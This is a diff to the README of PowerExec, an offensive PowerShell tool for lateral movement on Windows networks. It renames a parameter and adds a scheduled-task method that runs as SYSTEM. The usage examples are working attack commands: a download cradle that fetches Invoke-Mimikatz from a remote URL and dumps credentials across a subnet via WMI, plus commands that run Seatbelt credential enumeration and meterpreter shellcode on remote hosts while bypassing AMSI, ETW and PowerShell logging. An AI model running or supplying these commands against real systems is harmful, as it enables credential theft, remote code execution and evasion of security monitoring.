@@ -5,7 +5,7 @@ PowerExec is a PowerShell tool to move laterally on a Windows network.
 ## Functions
 
 ```
-Invoke-PowerExec                -   execute PowerShell script block on remote computers through various techniques
+Invoke-PowerExec                -   execute PowerShell script block on remote computers through various methods
 New-PowerLoader                 -   build script block which safely loads PowerShell, .NET assembly or shellcode
 ```
 
@@ -14,19 +14,19 @@ New-PowerLoader                 -   build script block which safely loads PowerS
 Run a PowerShell script through WMI using a download cradle while bypassing Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW):
 
 ```
-PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
+PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Method WMI -Threads 10
 ```
 
-Run a .NET assembly through WinRM while bypassing AMSI and ETW:
+Run a .NET assembly through WinRM while bypassing AMSI, Script Block Logging (SBL) and PowerShell Module Logging (PML):
 
 ```
-PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Protocol WinRM
+PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,SBL,PML | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Method WinRM
 ```
 
-Run a shellcode through WinRM while bypassing AMSI, Script Block Logging (SBL) and PowerShell Module Logging (PML) :
+Run a shellcode through a scheduled task as NT AUTHORITY\SYSTEM while bypassing AMSI :
 
 ```
-PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin -Bypass AMSI,SBL,PML | Invoke-PowerExec -ComputerList 192.168.1.1 -Protocol WinRM
+PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin -Bypass AMSI | Invoke-PowerExec -ComputerList 192.168.1.1 -Method SchTask
 ```
 
 ## Credits
